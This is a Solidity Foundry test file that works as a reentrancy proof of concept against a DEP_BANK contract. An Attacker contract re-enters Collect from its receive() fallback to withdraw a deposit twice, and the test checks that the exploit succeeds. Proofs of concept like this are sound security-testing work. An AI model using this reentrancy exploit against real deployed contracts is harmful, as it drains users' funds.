
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {DEP_BANK, LogFile} from "../src/DEP_BANK.sol";

contract TestReentrancyDEP_BANK is Test {

    DEP_BANK public bank;
    LogFile public log;
    Attacker public _attacker;

    function setUp() public {
        log = new LogFile();
        bank = new DEP_BANK();
        bank.SetMinSum(1);
        bank.SetLogFile(address(log));
        bank.Initialized();
        _attacker = new Attacker(address(bank));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= 1 && attackVal < type(uint128).max);
        

        vm.deal(address(bank), attackVal);
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    DEP_BANK public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 storedVal;

    constructor(address victimAddress) { 
        victim = DEP_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        storedVal = val;
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        victim.Collect(val);

        if (address(this).balance == initialSnapshot + 2 * val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.Collect(storedVal);
        } else {
            revert();
        }
    }
}
